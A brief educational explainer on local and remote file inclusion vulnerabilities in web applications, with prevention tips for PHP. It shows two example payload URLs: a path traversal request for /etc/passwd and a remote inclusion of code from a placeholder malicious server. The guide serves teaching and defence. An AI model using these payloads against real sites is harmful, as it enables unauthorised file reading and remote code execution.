# File Inclusion Attacks

## Overview

File inclusion vulnerabilities occur when web applications allow the inclusion of external files without proper validation. These can be exploited to read sensitive files or execute malicious code on the server.

---

## Types of File Inclusion Attacks

### 1. Local File Inclusion (LFI)

- Reads local files on the server
- Often used to access sensitive files like configuration or password files
- Example payload: 
- http://targetsite.com/vulnerable.php?file=../../etc/passwd

- Attack URL tries to include sensitive server files for reading.

### 2. Remote File Inclusion (RFI)

- Executes malicious remote code hosted on an attacker-controlled server
- Typically involves including a URL pointing to malicious code:
- http://targetsite.com/vulnerable.php?file=http://malicious-server.com/malicious.php

- Allows attacker to execute arbitrary code on the server.

---

## How to Prevent File Inclusion Attacks

- Validate user inputs strictly against a whitelist.
- Avoid passing user input directly to include, require, or similar functions.
- Use fixed file paths or identifiers instead of dynamic paths.
- Disable allow_url_fopen and allow_url_include in PHP configurations.
- Keep web server and scripts updated.

---

## Summary

File inclusion vulnerabilities pose serious security risks. Proper input validation and server configuration are critical in preventing exploits.

---


